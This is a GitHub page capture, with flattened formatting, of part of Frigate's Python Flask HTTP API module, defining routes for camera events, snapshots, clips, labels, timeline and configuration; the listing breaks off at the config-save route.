1775 lines (1477 loc) · 53.6 KB[Raw](https://github.com/blakeblackshear/frigate/raw/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000import base64import copyimport globimport jsonimport loggingimport osimport subprocess as spimport timeimport tracebackfrom datetime import datetime, timedelta, timezonefrom functools import reducefrom pathlib import Pathfrom urllib.parse import unquote
import cv2import numpy as npimport pytzfrom flask import ( Blueprint, Flask, Response, current\_app, jsonify, make\_response, request,)from peewee import DoesNotExist, fn, operatorfrom playhouse.shortcuts import model\_to\_dictfrom playhouse.sqliteq import SqliteQueueDatabasefrom tzlocal import get\_localzone\_name
from frigate.config import FrigateConfigfrom frigate.const import ( CACHE\_DIR, CLIPS\_DIR, CONFIG\_DIR, MAX\_SEGMENT\_DURATION, RECORD\_DIR,)from frigate.events.external import ExternalEventProcessorfrom frigate.models import Event, Recordings, Timelinefrom frigate.object\_processing import TrackedObjectfrom frigate.plus import PlusApifrom frigate.ptz.onvif import OnvifControllerfrom frigate.record.export import PlaybackFactorEnum, RecordingExporterfrom frigate.stats import stats\_snapshotfrom frigate.storage import StorageMaintainerfrom frigate.util.builtin import ( clean\_camera\_user\_pass, get\_tz\_modifiers, update\_yaml\_from\_url,)from frigate.util.services import ffprobe\_stream, restart\_frigate, vainfo\_hwaccelfrom frigate.version import VERSION
logger = logging.getLogger(\_\_name\_\_)
bp = Blueprint("frigate", \_\_name\_\_)
def create\_app( frigate\_config, database: SqliteQueueDatabase, stats\_tracking, detected\_frames\_processor, storage\_maintainer: StorageMaintainer, onvif: OnvifController, external\_processor: ExternalEventProcessor, plus\_api: PlusApi,): app = Flask(\_\_name\_\_)
 @app.before\_request def \_db\_connect(): if database.is\_closed(): database.connect()
 @app.teardown\_request def \_db\_close(exc): if not database.is\_closed(): database.close()
 app.frigate\_config = frigate\_config app.stats\_tracking = stats\_tracking app.detected\_frames\_processor = detected\_frames\_processor app.storage\_maintainer = storage\_maintainer app.onvif = onvif app.external\_processor = external\_processor app.plus\_api = plus\_api app.camera\_error\_image = None app.hwaccel\_errors = []
 app.register\_blueprint(bp)
 return app
@bp.route("/")def is\_healthy(): return "Frigate is running. Alive and healthy!"
@bp.route("/events/summary")def events\_summary(): tz\_name = request.args.get("timezone", default="utc", type=str) hour\_modifier, minute\_modifier = get\_tz\_modifiers(tz\_name) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int)
 clauses = []
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if len(clauses) == 0: clauses.append((True))
 groups = ( Event.select( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ).alias("day"), Event.zones, fn.COUNT(Event.id).alias("count"), ) .where(reduce(operator.and\_, clauses)) .group\_by( Event.camera, Event.label, Event.sub\_label, fn.strftime( "%Y-%m-%d", fn.datetime( Event.start\_time, "unixepoch", hour\_modifier, minute\_modifier ), ), Event.zones, ) )
 return jsonify([e for e in groups.dicts()])
@bp.route("/events/<id>", methods=("GET",))def event(id): try: return model\_to\_dict(Event.get(Event.id == id)) except DoesNotExist: return "Event not found", 404
@bp.route("/events/<id>/retain", methods=("POST",))def set\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = True event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " retained"}), 200 )
@bp.route("/events/<id>/plus", methods=("POST",))def send\_to\_plus(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 include\_annotation = ( request.json.get("include\_annotation") if request.is\_json else None )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: include\_annotation = None
 if event.end\_time is None: logger.error(f"Unable to load clean png for in-progress event: {event.id}") return make\_response( jsonify( { "success": False, "message": "Unable to load clean png for in-progress event", } ), 400, )
 if event.plus\_id: message = "Already submitted to plus" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 # load clean.png try: filename = f"{event.camera}-{event.id}-clean.png" image = cv2.imread(os.path.join(CLIPS\_DIR, filename)) except Exception: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 if image is None or image.size == 0: logger.error(f"Unable to load clean png for event: {event.id}") return make\_response( jsonify( {"success": False, "message": "Unable to load clean png for event"} ), 400, )
 try: plus\_id = current\_app.plus\_api.upload\_image(image, event.camera) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 # store image id in the database event.plus\_id = plus\_id event.save()
 if include\_annotation is not None: box = event.data["box"]
 try: current\_app.plus\_api.add\_annotation( event.plus\_id, box, event.label, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 return make\_response(jsonify({"success": True, "plus\_id": plus\_id}), 200)
@bp.route("/events/<id>/false\_positive", methods=("PUT",))def false\_positive(id): if not current\_app.plus\_api.is\_active(): message = "PLUS\_API\_KEY environment variable is not set" logger.error(message) return make\_response( jsonify( { "success": False, "message": message, } ), 400, )
 try: event = Event.get(Event.id == id) except DoesNotExist: message = f"Event {id} not found" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 404)
 # events from before the conversion to relative dimensions cant include annotations if event.data.get("box") is None: message = "Events prior to 0.13 cannot be submitted as false positives" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if event.false\_positive: message = "False positive already submitted to Frigate+" logger.error(message) return make\_response(jsonify({"success": False, "message": message}), 400)
 if not event.plus\_id: plus\_response = send\_to\_plus(id) if plus\_response.status\_code != 200: return plus\_response # need to refetch the event now that it has a plus\_id event = Event.get(Event.id == id)
 region = event.data["region"] box = event.data["box"]
 # provide top score if score is unavailable score = ( (event.data["top\_score"] if event.data["top\_score"] else event.top\_score) if event.data["score"] is None else event.data["score"] )
 try: current\_app.plus\_api.add\_false\_positive( event.plus\_id, region, box, score, event.label, event.model\_hash, event.model\_type, event.detector\_type, ) except Exception as ex: logger.exception(ex) return make\_response( jsonify({"success": False, "message": str(ex)}), 400, )
 event.false\_positive = True event.save()
 return make\_response(jsonify({"success": True, "plus\_id": event.plus\_id}), 200)
@bp.route("/events/<id>/retain", methods=("DELETE",))def delete\_retain(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 event.retain\_indefinitely = False event.save()
 return make\_response( jsonify({"success": True, "message": "Event " + id + " un-retained"}), 200 )
@bp.route("/events/<id>/sub\_label", methods=("POST",))def set\_sub\_label(id): try: event: Event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {} new\_sub\_label = json.get("subLabel") new\_score = json.get("subLabelScore")
 if new\_sub\_label and len(new\_sub\_label) > 100: return make\_response( jsonify( { "success": False, "message": new\_sub\_label + " exceeds the 100 character limit for sub\_label", } ), 400, )
 if new\_score is not None and (new\_score > 1.0 or new\_score < 0): return make\_response( jsonify( { "success": False, "message": new\_score + " does not fit within the expected bounds 0 <= score <= 1.0", } ), 400, )
 if not event.end\_time: tracked\_obj: TrackedObject = ( current\_app.detected\_frames\_processor.camera\_states[ event.camera ].tracked\_objects.get(event.id) )
 if tracked\_obj: tracked\_obj.obj\_data["sub\_label"] = (new\_sub\_label, new\_score)
 event.sub\_label = new\_sub\_label
 if new\_score: data = event.data data["sub\_label\_score"] = new\_score event.data = data
 event.save() return make\_response( jsonify( { "success": True, "message": "Event " + id + " sub label set to " + new\_sub\_label, } ), 200, )
@bp.route("/labels")def get\_labels(): camera = request.args.get("camera", type=str, default="")
 try: if camera: events = Event.select(Event.label).where(Event.camera == camera).distinct() else: events = Event.select(Event.label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get labels: {e}"}), 404 )
 labels = sorted([e.label for e in events]) return jsonify(labels)
@bp.route("/sub\_labels")def get\_sub\_labels(): split\_joined = request.args.get("split\_joined", type=int)
 try: events = Event.select(Event.sub\_label).distinct() except Exception as e: return make\_response( jsonify({"success": False, "message": f"Failed to get sub\_labels: {e}"}), 404, )
 sub\_labels = [e.sub\_label for e in events]
 if None in sub\_labels: sub\_labels.remove(None)
 if split\_joined: original\_labels = sub\_labels.copy()
 for label in original\_labels: if "," in label: sub\_labels.remove(label) parts = label.split(",")
 for part in parts: if part.strip() not in sub\_labels: sub\_labels.append(part.strip())
 sub\_labels.sort() return jsonify(sub\_labels)
@bp.route("/events/<id>", methods=("DELETE",))def delete\_event(id): try: event = Event.get(Event.id == id) except DoesNotExist: return make\_response( jsonify({"success": False, "message": "Event " + id + " not found"}), 404 )
 media\_name = f"{event.camera}-{event.id}" if event.has\_snapshot: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.jpg") media.unlink(missing\_ok=True) media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}-clean.png") media.unlink(missing\_ok=True) if event.has\_clip: media = Path(f"{os.path.join(CLIPS\_DIR, media\_name)}.mp4") media.unlink(missing\_ok=True)
 event.delete\_instance() return make\_response( jsonify({"success": True, "message": "Event " + id + " deleted"}), 200 )
@bp.route("/events/<id>/thumbnail.jpg")def event\_thumbnail(id, max\_cache\_age=2592000): format = request.args.get("format", "ios") thumbnail\_bytes = None event\_complete = False try: event = Event.get(Event.id == id) if event.end\_time is not None: event\_complete = True thumbnail\_bytes = base64.b64decode(event.thumbnail) except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: thumbnail\_bytes = tracked\_obj.get\_thumbnail() except Exception: return "Event not found", 404
 if thumbnail\_bytes is None: return "Event not found", 404
 # android notifications prefer a 2:1 ratio if format == "android": jpg\_as\_np = np.frombuffer(thumbnail\_bytes, dtype=np.uint8) img = cv2.imdecode(jpg\_as\_np, flags=1) thumbnail = cv2.copyMakeBorder( img, 0, 0, int(img.shape[1] \* 0.5), int(img.shape[1] \* 0.5), cv2.BORDER\_CONSTANT, (0, 0, 0), ) ret, jpg = cv2.imencode(".jpg", thumbnail, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70]) thumbnail\_bytes = jpg.tobytes()
 response = make\_response(thumbnail\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = f"private, max-age={max\_cache\_age}" else: response.headers["Cache-Control"] = "no-store" return response
@bp.route("/timeline")def timeline(): camera = request.args.get("camera", "all") source\_id = request.args.get("source\_id", type=str) limit = request.args.get("limit", 100)
 clauses = []
 selected\_columns = [ Timeline.timestamp, Timeline.camera, Timeline.source, Timeline.source\_id, Timeline.class\_type, Timeline.data, ]
 if camera != "all": clauses.append((Timeline.camera == camera))
 if source\_id: clauses.append((Timeline.source\_id == source\_id))
 if len(clauses) == 0: clauses.append((True))
 timeline = ( Timeline.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Timeline.timestamp.asc()) .limit(limit) .dicts() )
 return jsonify([t for t in timeline])
@bp.route("/<camera\_name>/<label>/best.jpg")@bp.route("/<camera\_name>/<label>/thumbnail.jpg")def label\_thumbnail(camera\_name, label): label = unquote(label) event\_query = Event.select(fn.MAX(Event.id)).where(Event.camera == camera\_name) if label != "any": event\_query = event\_query.where(Event.label == label)
 try: event = event\_query.scalar()
 return event\_thumbnail(event, 60) except DoesNotExist: frame = np.zeros((175, 175, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" response.headers["Cache-Control"] = "no-store" return response
@bp.route("/events/<id>/snapshot.jpg")def event\_snapshot(id): download = request.args.get("download", type=bool) event\_complete = False jpg\_bytes = None try: event = Event.get(Event.id == id, Event.end\_time != None) event\_complete = True if not event.has\_snapshot: return "Snapshot not available", 404 # read snapshot from disk with open( os.path.join(CLIPS\_DIR, f"{event.camera}-{id}.jpg"), "rb" ) as image\_file: jpg\_bytes = image\_file.read() except DoesNotExist: # see if the object is currently being tracked try: camera\_states = current\_app.detected\_frames\_processor.camera\_states.values() for camera\_state in camera\_states: if id in camera\_state.tracked\_objects: tracked\_obj = camera\_state.tracked\_objects.get(id) if tracked\_obj is not None: jpg\_bytes = tracked\_obj.get\_jpg\_bytes( timestamp=request.args.get("timestamp", type=int), bounding\_box=request.args.get("bbox", type=int), crop=request.args.get("crop", type=int), height=request.args.get("h", type=int), quality=request.args.get("quality", default=70, type=int), ) except Exception: return "Event not found", 404 except Exception: return "Event not found", 404
 if jpg\_bytes is None: return "Event not found", 404
 response = make\_response(jpg\_bytes) response.headers["Content-Type"] = "image/jpeg" if event\_complete: response.headers["Cache-Control"] = "private, max-age=31536000" else: response.headers["Cache-Control"] = "no-store" if download: response.headers[ "Content-Disposition" ] = f"attachment; filename=snapshot-{id}.jpg" return response
@bp.route("/<camera\_name>/<label>/snapshot.jpg")def label\_snapshot(camera\_name, label): label = unquote(label) if label == "any": event\_query = ( Event.select(Event.id) .where(Event.camera == camera\_name) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) ) else: event\_query = ( Event.select(Event.id) .where(Event.camera == camera\_name) .where(Event.label == label) .where(Event.has\_snapshot == True) .order\_by(Event.start\_time.desc()) )
 try: event = event\_query.get() return event\_snapshot(event.id) except DoesNotExist: frame = np.zeros((720, 1280, 3), np.uint8) ret, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE\_JPEG\_QUALITY), 70])
 response = make\_response(jpg.tobytes()) response.headers["Content-Type"] = "image/jpeg" return response
@bp.route("/events/<id>/clip.mp4")def event\_clip(id): download = request.args.get("download", type=bool)
 try: event: Event = Event.get(Event.id == id) except DoesNotExist: return "Event not found.", 404
 if not event.has\_clip: return "Clip not available", 404
 file\_name = f"{event.camera}-{id}.mp4" clip\_path = os.path.join(CLIPS\_DIR, file\_name)
 if not os.path.isfile(clip\_path): end\_ts = ( datetime.now().timestamp() if event.end\_time is None else event.end\_time ) return recording\_clip(event.camera, event.start\_time, end\_ts)
 response = make\_response() response.headers["Content-Description"] = "File Transfer" response.headers["Cache-Control"] = "no-cache" response.headers["Content-Type"] = "video/mp4" if download: response.headers["Content-Disposition"] = "attachment; filename=%s" % file\_name response.headers["Content-Length"] = os.path.getsize(clip\_path) response.headers[ "X-Accel-Redirect" ] = f"/clips/{file\_name}" # nginx: http://wiki.nginx.org/NginxXSendfile
 return response
@bp.route("/events")def events(): camera = request.args.get("camera", "all") cameras = request.args.get("cameras", "all")
 # handle old camera arg if cameras == "all" and camera != "all": cameras = camera
 label = unquote(request.args.get("label", "all")) labels = request.args.get("labels", "all")
 # handle old label arg if labels == "all" and label != "all": labels = label
 sub\_label = request.args.get("sub\_label", "all") sub\_labels = request.args.get("sub\_labels", "all")
 # handle old sub\_label arg if sub\_labels == "all" and sub\_label != "all": sub\_labels = sub\_label
 zone = request.args.get("zone", "all") zones = request.args.get("zones", "all")
 # handle old label arg if zones == "all" and zone != "all": zones = zone
 limit = request.args.get("limit", 100) after = request.args.get("after", type=float) before = request.args.get("before", type=float) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int) in\_progress = request.args.get("in\_progress", type=int) include\_thumbnails = request.args.get("include\_thumbnails", default=1, type=int) favorites = request.args.get("favorites", type=int)
 clauses = []
 selected\_columns = [ Event.id, Event.camera, Event.label, Event.zones, Event.start\_time, Event.end\_time, Event.has\_clip, Event.has\_snapshot, Event.plus\_id, Event.retain\_indefinitely, Event.sub\_label, Event.top\_score, Event.false\_positive, Event.box, Event.data, ]
 if camera != "all": clauses.append((Event.camera == camera))
 if cameras != "all": camera\_list = cameras.split(",") clauses.append((Event.camera << camera\_list))
 if labels != "all": label\_list = labels.split(",") clauses.append((Event.label << label\_list))
 if sub\_labels != "all": # use matching so joined sub labels are included # for example a sub label 'bob' would get events # with sub labels 'bob' and 'bob, john' sub\_label\_clauses = [] filtered\_sub\_labels = sub\_labels.split(",")
 if "None" in filtered\_sub\_labels: filtered\_sub\_labels.remove("None") sub\_label\_clauses.append((Event.sub\_label.is\_null()))
 for label in filtered\_sub\_labels: sub\_label\_clauses.append( (Event.sub\_label.cast("text") == label) ) # include exact matches
 # include this label when part of a list sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*{label},\*")) sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*, {label}\*"))
 sub\_label\_clause = reduce(operator.or\_, sub\_label\_clauses) clauses.append((sub\_label\_clause))
 if zones != "all": # use matching so events with multiple zones # still match on a search where any zone matches zone\_clauses = [] filtered\_zones = zones.split(",")
 if "None" in filtered\_zones: filtered\_zones.remove("None") zone\_clauses.append((Event.zones.length() == 0))
 for zone in filtered\_zones: zone\_clauses.append((Event.zones.cast("text") % f'\*"{zone}"\*'))
 zone\_clause = reduce(operator.or\_, zone\_clauses) clauses.append((zone\_clause))
 if after: clauses.append((Event.start\_time > after))
 if before: clauses.append((Event.start\_time < before))
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if in\_progress is not None: clauses.append((Event.end\_time.is\_null(in\_progress)))
 if include\_thumbnails: selected\_columns.append(Event.thumbnail)
 if favorites: clauses.append((Event.retain\_indefinitely == favorites))
 if len(clauses) == 0: clauses.append((True))
 events = ( Event.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Event.start\_time.desc()) .limit(limit) .dicts() )
 return jsonify([e for e in events])
@bp.route("/events/<camera\_name>/<label>/create", methods=["POST"])def create\_event(camera\_name, label): if not camera\_name or not current\_app.frigate\_config.cameras.get(camera\_name): return make\_response( jsonify( {"success": False, "message": f"{camera\_name} is not a valid camera."} ), 404, )
 if not label: return make\_response( jsonify({"success": False, "message": f"{label} must be set."}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {}
 try: frame = current\_app.detected\_frames\_processor.get\_current\_frame(camera\_name)
 event\_id = current\_app.external\_processor.create\_manual\_event( camera\_name, label, json.get("source\_type", "api"), json.get("sub\_label", None), json.get("score", 0), json.get("duration", 30), json.get("include\_recording", True), json.get("draw", {}), frame, ) except Exception as e: return make\_response( jsonify({"success": False, "message": f"An unknown error occurred: {e}"}), 500, )
 return make\_response( jsonify( { "success": True, "message": "Successfully created event.", "event\_id": event\_id, } ), 200, )
@bp.route("/events/<event\_id>/end", methods=["PUT"])def end\_event(event\_id): json: dict[str, any] = request.get\_json(silent=True) or {}
 try: end\_time = json.get("end\_time", datetime.now().timestamp()) current\_app.external\_processor.finish\_manual\_event(event\_id, end\_time) except Exception: return make\_response( jsonify( {"success": False, "message": f"{event\_id} must be set and valid."} ), 404, )
 return make\_response( jsonify({"success": True, "message": "Event successfully ended."}), 200 )
@bp.route("/config")def config(): config = current\_app.frigate\_config.dict()
 for camera\_name, camera in current\_app.frigate\_config.cameras.items(): camera\_dict = config["cameras"][camera\_name]
 # clean paths for input in camera\_dict.get("ffmpeg", {}).get("inputs", []): input["path"] = clean\_camera\_user\_pass(input["path"])
 # add clean ffmpeg\_cmds camera\_dict["ffmpeg\_cmds"] = copy.deepcopy(camera.ffmpeg\_cmds) for cmd in camera\_dict["ffmpeg\_cmds"]: cmd["cmd"] = clean\_camera\_user\_pass(" ".join(cmd["cmd"]))
 config["plus"] = {"enabled": current\_app.plus\_api.is\_active()}
 for detector, detector\_config in config["detectors"].items(): detector\_config["model"][ "labelmap" ] = current\_app.frigate\_config.model.merged\_labelmap
 return jsonify(config)
@bp.route("/config/raw")def config\_raw(): config\_file = os.environ.get("CONFIG\_FILE", "/config/config.yml")
 # Check if we can use .yaml instead of .yml config\_file\_yaml = config\_file.replace(".yml", ".yaml")
 if os.path.isfile(config\_file\_yaml): config\_file = config\_file\_yaml
 if not os.path.isfile(config\_file): return "Could not find file", 410
 with open(config\_file, "r") as f: raw\_config = f.read() f.close()
 return raw\_config, 200
@bp.route("/config/save", methods=["POST"])def config\_save(): save\_option = request.args.get("save\_option")
[View remainder of file in raw view](https://github.com/blakeblackshear/frigate/raw/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


